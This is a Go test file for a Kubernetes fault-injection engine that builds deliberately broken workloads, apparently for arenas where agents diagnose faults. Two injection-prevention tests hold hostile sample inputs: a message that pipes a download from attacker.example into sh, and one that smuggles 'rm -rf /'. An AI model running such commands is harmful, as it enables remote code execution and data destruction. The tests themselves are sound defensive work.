// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package kubestate

import (
	"strconv"
	"strings"
	"testing"

	appsv1 "k8s.io/api/apps/v1"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/client-go/kubernetes/fake"
)

// testSynthesis is the identity the driver hands a builder. Fixed rather than
// derived, so a test can assert on the names a bundle wires its objects
// together with.
func testSynthesis(spec map[string]any) synthesis {
	return synthesis{name: "workload", namespace: "arena-1", replicas: 1, spec: spec}
}

func bundle(t *testing.T, kind string, spec map[string]any) []runtime.Object {
	t.Helper()
	objs, err := builders[kind](testSynthesis(spec))
	if err != nil {
		t.Fatalf("build %s: %v", kind, err)
	}
	return objs
}

// build returns the pod spec carried by the bundle's Deployment, for the kinds
// whose whole fault is one workload.
func build(t *testing.T, kind string, spec map[string]any) corev1.PodSpec {
	t.Helper()
	for _, obj := range bundle(t, kind, spec) {
		if d, ok := obj.(*appsv1.Deployment); ok {
			return d.Spec.Template.Spec
		}
	}
	t.Fatalf("build %s: bundle contains no Deployment", kind)
	return corev1.PodSpec{}
}

func buildErr(t *testing.T, kind string, spec map[string]any) error {
	t.Helper()
	if _, err := builders[kind](testSynthesis(spec)); err != nil {
		return err
	}
	t.Fatalf("build %s with spec %v succeeded, want error", kind, spec)
	return nil
}

func TestImageUnresolvablePod(t *testing.T) {
	ps := build(t, KindImageUnresolvable, nil)
	c := ps.Containers[0]
	if c.Image != defaultBadImage {
		t.Errorf("image = %q, want %q", c.Image, defaultBadImage)
	}
	// PullIfNotPresent would let a warm image cache on one node silently heal
	// the fault, so the same manifest would land or not depending on where the
	// scheduler put the pod.
	if c.ImagePullPolicy != corev1.PullAlways {
		t.Errorf("pull policy = %q, want %q", c.ImagePullPolicy, corev1.PullAlways)
	}
	if got := build(t, KindImageUnresolvable, map[string]any{"image": "example.invalid/x:1"}).Containers[0].Image; got != "example.invalid/x:1" {
		t.Errorf("spec.image ignored: got %q", got)
	}
}

func TestContainerExitLoopPod(t *testing.T) {
	ps := build(t, KindContainerExitLoop, nil)
	c := ps.Containers[0]
	if c.Image != defaultRunnerImage {
		t.Errorf("image = %q, want %q", c.Image, defaultRunnerImage)
	}
	cmd := strings.Join(c.Command, " ")
	if !strings.Contains(cmd, "exit 1") {
		t.Errorf("command %q does not exit non-zero", cmd)
	}
	var msg string
	for _, e := range c.Env {
		if e.Name == exitMessageEnv {
			msg = e.Value
		}
	}
	if msg != defaultExitMessage {
		t.Errorf("%s = %q, want %q", exitMessageEnv, msg, defaultExitMessage)
	}
}

func TestContainerExitLoopCustomCode(t *testing.T) {
	cmd := strings.Join(build(t, KindContainerExitLoop, map[string]any{"exit_code": float64(137)}).Containers[0].Command, " ")
	if !strings.Contains(cmd, "exit 137") {
		t.Errorf("command %q does not carry the requested exit code", cmd)
	}
}

// The message is caller-supplied text that ends up next to a shell. It has to
// travel as an environment variable; interpolating it into the command string
// is how a scenario pack that wants a specific log line becomes arbitrary
// command execution inside the arena.
func TestContainerExitLoopMessageNeverReachesTheCommand(t *testing.T) {
	evil := `x"; wget http://attacker.example/p | sh; echo "`
	c := build(t, KindContainerExitLoop, map[string]any{"message": evil}).Containers[0]
	cmd := strings.Join(c.Command, " ")
	if strings.Contains(cmd, "wget") || strings.Contains(cmd, evil) {
		t.Fatalf("caller message was interpolated into the command: %q", cmd)
	}
	if c.Env[0].Value != evil {
		t.Errorf("message did not survive as an env value: %q", c.Env[0].Value)
	}
}

func TestContainerExitLoopRejects(t *testing.T) {
	// exit 0 still crash-loops, but the pod reports lastState reason
	// Completed, which poses a different diagnosis than this kind exists for.
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": float64(0)}); !strings.Contains(err.Error(), "non-zero") {
		t.Errorf("exit_code 0: %v", err)
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": float64(256)}); !strings.Contains(err.Error(), "between 1 and 255") {
		t.Errorf("exit_code 256: %v", err)
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": float64(-1)}); err == nil {
		t.Error("negative exit code accepted")
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": "one"}); !strings.Contains(err.Error(), "must be a number") {
		t.Errorf("non-numeric exit_code: %v", err)
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": 1.5}); !strings.Contains(err.Error(), "whole number") {
		t.Errorf("fractional exit_code: %v", err)
	}
}

func TestMemoryLimitSqueezePod(t *testing.T) {
	ps := build(t, KindMemoryLimitSqueeze, nil)
	c := ps.Containers[0]
	want := resource.MustParse(defaultMemoryLimit)
	if got := c.Resources.Limits[corev1.ResourceMemory]; got.Cmp(want) != 0 {
		t.Errorf("memory limit = %s, want %s", got.String(), want.String())
	}
	// requests == limits, or the pod becomes an eviction candidate under node
	// pressure and the fault sometimes reads as a node problem instead.
	if got := c.Resources.Requests[corev1.ResourceMemory]; got.Cmp(want) != 0 {
		t.Errorf("memory request = %s, want %s", got.String(), want.String())
	}
	// The allocation must be anonymous memory, freed when the process dies. A
	// memory-backed emptyDir belongs to the pod: its pages outlive the
	// container, and the restarted container's runc init is OOM-killed before
	// any of our code runs, so the pod reports StartError and the OOM kill the
	// fault is about is overwritten within seconds. Measured on GKE.
	if len(ps.Volumes) != 0 {
		t.Errorf("pod carries volumes %+v; tmpfs pages survive the restart and turn OOMKilled into StartError", ps.Volumes)
	}
	if len(c.VolumeMounts) != 0 {
		t.Errorf("container mounts %+v, want none", c.VolumeMounts)
	}
	cmd := strings.Join(c.Command, " ")
	if want := strconv.Itoa(defaultMemoryAllocateMB * 1024 * 1024); !strings.Contains(cmd, want) {
		t.Errorf("command %q does not allocate %dMi (%s bytes)", cmd, defaultMemoryAllocateMB, want)
	}
	// If the allocation somehow stays inside the limit the container must
	// idle, not exit: a container that exits crash-loops, and a crash loop is
	// the diagnosis ContainerExitLoop poses.
	if !strings.Contains(cmd, "; sleep") {
		t.Errorf("command %q exits instead of idling when the allocation does not trip the limit", cmd)
	}
}

func TestMemoryLimitSqueezeRejects(t *testing.T) {
	// A container that stays inside its cgroup is never OOMKilled: the fault
	// would apply cleanly and do nothing, which is the failure mode the whole
	// efficacy story exists to prevent.
	err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "256Mi", "allocate_mb": float64(64)})
	if !strings.Contains(err.Error(), "must exceed") {
		t.Errorf("allocation inside the limit: %v", err)
	}
	// Exactly at the limit is not over it.
	if err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "64Mi", "allocate_mb": float64(64)}); err == nil {
		t.Error("allocate_mb exactly equal to the limit was accepted")
	}
	if err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "not-a-quantity"}); !strings.Contains(err.Error(), "not a quantity") {
		t.Errorf("bad quantity: %v", err)
	}
	if err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"allocate_mb": float64(0)}); !strings.Contains(err.Error(), "positive") {
		t.Errorf("zero allocation: %v", err)
	}
}

func TestMemoryLimitSqueezeCustomSizes(t *testing.T) {
	ps := build(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "16Mi", "allocate_mb": float64(48)})
	c := ps.Containers[0]
	want := resource.MustParse("16Mi")
	if got := c.Resources.Limits[corev1.ResourceMemory]; got.Cmp(want) != 0 {
		t.Errorf("limit = %s, want 16Mi", got.String())
	}
	if !strings.Contains(strings.Join(c.Command, " "), strconv.Itoa(48*1024*1024)) {
		t.Errorf("command does not allocate 48Mi: %v", c.Command)
	}
}

func TestUnschedulablePodByCPU(t *testing.T) {
	ps := build(t, KindUnschedulable, nil)
	got := ps.Containers[0].Resources.Requests[corev1.ResourceCPU]
	want := resource.MustParse(defaultUnschedulableCPU)
	if got.Cmp(want) != 0 {
		t.Errorf("cpu request = %s, want %s", got.String(), want.String())
	}
	// A merely-large request is a provisioning signal: a cluster autoscaler or
	// GKE Node Auto-Provisioning would add a node, the pod would schedule, and
	// the fault would heal partway through the experiment with a machine on
	// the bill. The default has to be beyond any shape a cloud sells.
	if got.Cmp(resource.MustParse("512")) < 0 {
		t.Errorf("default cpu request %s is small enough for an autoscaler to satisfy", got.String())
	}
	if ps.NodeSelector != nil {
		t.Errorf("unexpected node selector %v", ps.NodeSelector)
	}
}

func TestUnschedulablePodByNodeSelector(t *testing.T) {
	ps := build(t, KindUnschedulable, map[string]any{
		"node_selector": map[string]any{"failure-domain.example.com/zone": "nowhere"},
	})
	if ps.NodeSelector["failure-domain.example.com/zone"] != "nowhere" {
		t.Errorf("node selector = %v", ps.NodeSelector)
	}
	// Mutually exclusive with the CPU request: with both set, the
	// FailedScheduling message would name whichever predicate the scheduler
	// happened to evaluate first, and the evidence the agent reads would be
	// non-deterministic.
	if len(ps.Containers[0].Resources.Requests) != 0 {
		t.Errorf("node_selector did not suppress the cpu request: %v", ps.Containers[0].Resources.Requests)
	}
}

func TestUnschedulableNodeSelectorWinsOverRequestCPU(t *testing.T) {
	ps := build(t, KindUnschedulable, map[string]any{
		"request_cpu":   "999",
		"node_selector": map[string]any{"k": "v"},
	})
	if len(ps.Containers[0].Resources.Requests) != 0 {
		t.Errorf("both mechanisms applied: %v", ps.Containers[0].Resources.Requests)
	}
}

func TestUnschedulableRejects(t *testing.T) {
	if err := buildErr(t, KindUnschedulable, map[string]any{"request_cpu": "lots"}); !strings.Contains(err.Error(), "not a quantity") {
		t.Errorf("bad cpu quantity: %v", err)
	}
	if err := buildErr(t, KindUnschedulable, map[string]any{"request_cpu": "0"}); !strings.Contains(err.Error(), "positive") {
		t.Errorf("zero cpu: %v", err)
	}
	if err := buildErr(t, KindUnschedulable, map[string]any{"node_selector": "zone=nowhere"}); !strings.Contains(err.Error(), "must be an object") {
		t.Errorf("scalar node_selector: %v", err)
	}
	if err := buildErr(t, KindUnschedulable, map[string]any{"node_selector": map[string]any{"k": float64(1)}}); !strings.Contains(err.Error(), "must be a string") {
		t.Errorf("non-string node_selector value: %v", err)
	}
}

func TestOptHelpers(t *testing.T) {
	if got := optString(nil, "x", "def"); got != "def" {
		t.Errorf("optString(nil) = %q", got)
	}
	// An empty string is the same as unset: a planner that emits "name": ""
	// must not produce a workload named "-<suffix>".
	if got := optString(map[string]any{"x": ""}, "x", "def"); got != "def" {
		t.Errorf("optString(empty) = %q, want the default", got)
	}
	if got := optString(map[string]any{"x": float64(3)}, "x", "def"); got != "def" {
		t.Errorf("optString(non-string) = %q, want the default", got)
	}
	for _, v := range []any{int(7), int64(7), float64(7)} {
		n, err := optInt(map[string]any{"x": v}, "x", 0)
		if err != nil || n != 7 {
			t.Errorf("optInt(%T) = %d, %v", v, n, err)
		}
	}
	if n, err := optInt(map[string]any{"y": 1}, "x", 5); err != nil || n != 5 {
		t.Errorf("optInt(missing) = %d, %v", n, err)
	}
	if m, err := optStringMap(nil, "x"); err != nil || m != nil {
		t.Errorf("optStringMap(nil) = %v, %v", m, err)
	}
}

// --- the bundle kinds ---

func TestHealthyWorkloadIsTheControl(t *testing.T) {
	ps := build(t, KindNoOp, nil)
	c := ps.Containers[0]
	if c.Image != defaultRunnerImage {
		t.Errorf("image = %q, want %q", c.Image, defaultRunnerImage)
	}
	// The control has to be a scenario in every respect except being broken.
	// A control that applied nothing could be scored right by counting
	// objects, and a control whose one workload is subtly wrong is not a
	// control at all.
	if len(bundle(t, KindNoOp, nil)) != 1 {
		t.Errorf("bundle = %d objects, want one Deployment", len(bundle(t, KindNoOp, nil)))
	}
	if c.Resources.Limits != nil || c.Resources.Requests != nil {
		t.Errorf("control workload carries resource constraints: %+v", c.Resources)
	}
	if !strings.Contains(strings.Join(c.Command, " "), "sleep") {
		t.Errorf("control command %q does not idle", c.Command)
	}
}

func jobOf(t *testing.T, spec map[string]any) *batchv1.Job {
	t.Helper()
	for _, obj := range bundle(t, KindJobFailure, spec) {
		if j, ok := obj.(*batchv1.Job); ok {
			return j
		}
	}
	t.Fatal("JobFailure bundle contains no Job")
	return nil
}

func TestJobFailureRunsUntilItGivesUp(t *testing.T) {
	j := jobOf(t, nil)
	if got := *j.Spec.BackoffLimit; got != defaultBackoffLimit {
		t.Errorf("backoffLimit = %d, want %d", got, defaultBackoffLimit)
	}
	// Never, not OnFailure. Under OnFailure the kubelet restarts the container
	// in place, the Job's own backoff never advances, and it crash-loops
	// forever instead of reaching BackoffLimitExceeded — which is the state
	// the efficacy gate reads and the diagnosis this kind exists to pose.
	if got := j.Spec.Template.Spec.RestartPolicy; got != corev1.RestartPolicyNever {
		t.Errorf("restartPolicy = %q, want %q", got, corev1.RestartPolicyNever)
	}
	c := j.Spec.Template.Spec.Containers[0]
	if !strings.Contains(strings.Join(c.Command, " "), "exit 1") {
		t.Errorf("command %q does not exit non-zero", c.Command)
	}
	// The gate selects on app=<name>, and it selects the Job, not its pods.
	if j.Labels["app"] != "workload" || j.Spec.Template.Labels["app"] != "workload" {
		t.Errorf("labels = %v / %v, want app=workload on both", j.Labels, j.Spec.Template.Labels)
	}
}

func TestJobFailureCarriesItsMessageOutOfBandOfTheCommand(t *testing.T) {
	j := jobOf(t, map[string]any{"message": "boom\"; rm -rf /; echo \""})
	c := j.Spec.Template.Spec.Containers[0]
	if strings.Contains(strings.Join(c.Command, " "), "rm -rf") {
		t.Errorf("caller text reached the command: %q", c.Command)
	}
	if c.Env[0].Name != exitMessageEnv || !strings.Contains(c.Env[0].Value, "rm -rf") {
		t.Errorf("message did not travel as an environment variable: %+v", c.Env)
	}
}

func TestJobFailureRejects(t *testing.T) {
	// Exit 0 is the one that would apply cleanly and produce a healthy
	// namespace: the Job succeeds and the scenario has no fault in it.
	if err := buildErr(t, KindJobFailure, map[string]any{"exit_code": float64(0)}); !strings.Contains(err.Error(), "between 1 and 255") {
		t.Errorf("zero exit code: %v", err)
	}
	if err := buildErr(t, KindJobFailure, map[string]any{"exit_code": float64(300)}); !strings.Contains(err.Error(), "between 1 and 255") {
		t.Errorf("out of range exit code: %v", err)
	}
	// The retry delay doubles, so a large limit puts BackoffLimitExceeded
	// hours out and the fault's lease expires long before the gate passes.
	if err := buildErr(t, KindJobFailure, map[string]any{"backoff_limit": float64(maxBackoffLimit + 1)}); !strings.Contains(err.Error(), "backoff_limit") {
		t.Errorf("excessive backoff limit: %v", err)
	}
	if err := buildErr(t, KindJobFailure, map[string]any{"backoff_limit": float64(-1)}); !strings.Contains(err.Error(), "backoff_limit") {
		t.Errorf("negative backoff limit: %v", err)
	}
}

func TestJobFailureAcceptsZeroRetries(t *testing.T) {
	// Zero is a legal limit and the fastest one: the Job fails on its first
	// attempt. Only the *upper* bound is a problem.
	if got := *jobOf(t, map[string]any{"backoff_limit": float64(0)}).Spec.BackoffLimit; got != 0 {
		t.Errorf("backoffLimit = %d, want 0", got)
	}
}

func serviceOf(t *testing.T, spec map[string]any) (*corev1.Service, *appsv1.Deployment) {
	t.Helper()
	var svc *corev1.Service
	var dep *appsv1.Deployment
	for _, obj := range bundle(t, KindSelectorDrift, spec) {
		switch o := obj.(type) {
		case *corev1.Service:
			svc = o
		case *appsv1.Deployment:
			dep = o
		}
	}
	if svc == nil || dep == nil {
		t.Fatalf("SelectorDrift bundle = %T, want a Service and a Deployment", bundle(t, KindSelectorDrift, spec))
	}
	return svc, dep
}

func TestSelectorDriftPointsTheServicePastItsOwnWorkload(t *testing.T) {
	svc, dep := serviceOf(t, nil)
	pods := dep.Spec.Template.Labels
	if svc.Spec.Selector["app"] == pods["app"] {
		t.Fatalf("service selects its own pods (%v): there is no fault here", svc.Spec.Selector)
	}
	if got, want := svc.Spec.Selector["app"], "workload"+defaultDriftSuffix; got != want {
		t.Errorf("selector = %q, want %q", got, want)
	}
	// Running and Ready, every one of them. The fault lives between the two
	// objects, and a subject that grades `kubectl get pods` sees nothing.
	if len(dep.Spec.Template.Spec.Containers[0].Command) == 0 {
		t.Error("drifted workload has no command; it must come up healthy")
	}
	if got := svc.Spec.Ports[0].Port; got != defaultServicePort {
		t.Errorf("port = %d, want %d", got, defaultServicePort)
	}
	// The endpointslice half of the gate finds the slices by the Service's
	// name, so the Service has to share the bundle's name.
	if svc.Name != dep.Name {
		t.Errorf("service %q and deployment %q must share the bundle name", svc.Name, dep.Name)
	}
}

func TestSelectorDriftRejects(t *testing.T) {
	// The selector that matches after all is the one that produces a fault
	// which applies cleanly and does nothing.
	if err := buildErr(t, KindSelectorDrift, map[string]any{"selector_value": "workload"}); !strings.Contains(err.Error(), "own label value") {
		t.Errorf("self-selecting drift: %v", err)
	}
	if err := buildErr(t, KindSelectorDrift, map[string]any{"selector_value": "not a label!"}); !strings.Contains(err.Error(), "not a valid label value") {
		t.Errorf("illegal label value: %v", err)
	}
	if err := buildErr(t, KindSelectorDrift, map[string]any{"port": float64(0)}); !strings.Contains(err.Error(), "port") {
		t.Errorf("zero port: %v", err)
	}
	if err := buildErr(t, KindSelectorDrift, map[string]any{"port": float64(70000)}); !strings.Contains(err.Error(), "port") {
		t.Errorf("out of range port: %v", err)
	}
}

func TestUnboundClaimBlocksTheWorkloadBehindTheClaim(t *testing.T) {
	objs := bundle(t, KindUnboundClaim, nil)
	// The claim first. A Deployment whose pod references a claim that does not
	// exist yet reports FailedMount, which is a different fault than the
	// unschedulable pod the gate reads.
	pvc, ok := objs[0].(*corev1.PersistentVolumeClaim)
	if !ok {
		t.Fatalf("first object is %T, want the claim", objs[0])
	}
	dep, ok := objs[1].(*appsv1.Deployment)
	if !ok {
		t.Fatalf("second object is %T, want the Deployment", objs[1])
	}
	// An empty storageClassName means the cluster default, which on a managed
	// cluster is a real provisioner that binds within seconds and heals the
	// fault before the subject ever sees it.
	if pvc.Spec.StorageClassName == nil || *pvc.Spec.StorageClassName != defaultMissingStorageClass {
		t.Errorf("storageClassName = %v, want %q", pvc.Spec.StorageClassName, defaultMissingStorageClass)
	}
	if got := pvc.Spec.Resources.Requests[corev1.ResourceStorage]; got.String() != defaultClaimSize {
		t.Errorf("size = %s, want %s", got.String(), defaultClaimSize)
	}
	vols := dep.Spec.Template.Spec.Volumes
	if len(vols) != 1 || vols[0].PersistentVolumeClaim == nil || vols[0].PersistentVolumeClaim.ClaimName != pvc.Name {
		t.Fatalf("deployment does not mount the claim: %+v", vols)
	}
	if mounts := dep.Spec.Template.Spec.Containers[0].VolumeMounts; len(mounts) != 1 || mounts[0].Name != vols[0].Name {
		t.Errorf("volume is declared but not mounted: %+v", mounts)
	}
}

func TestUnboundClaimRejects(t *testing.T) {
	if err := buildErr(t, KindUnboundClaim, map[string]any{"size": "plenty"}); !strings.Contains(err.Error(), "not a quantity") {
		t.Errorf("bad size: %v", err)
	}
	if err := buildErr(t, KindUnboundClaim, map[string]any{"size": "0"}); !strings.Contains(err.Error(), "positive") {
		t.Errorf("zero size: %v", err)
	}
	if err := buildErr(t, KindUnboundClaim, map[string]any{"storage_class": "Not A Class"}); !strings.Contains(err.Error(), "not a valid name") {
		t.Errorf("illegal storage class: %v", err)
	}
}

// Every kind this engine advertises has to be creatable. The type switch in
// createObject is the only place that knows how, and a builder returning a
// type it has no case for would pass every builder test and fail at apply
// time, in a cluster, against a scenario that had already provisioned an
// arena.
func TestEveryKindSynthesizesObjectsTheEngineCanCreate(t *testing.T) {
	for _, kind := range Kinds() {
		objs := bundle(t, kind, nil)
		if len(objs) == 0 {
			t.Errorf("%s: bundle is empty", kind)
			continue
		}
		for _, obj := range objs {
			if err := createObject(t.Context(), fake.NewSimpleClientset(), "arena-1", obj); err != nil {
				t.Errorf("%s: create %T: %v", kind, obj, err)
			}
		}
	}
}
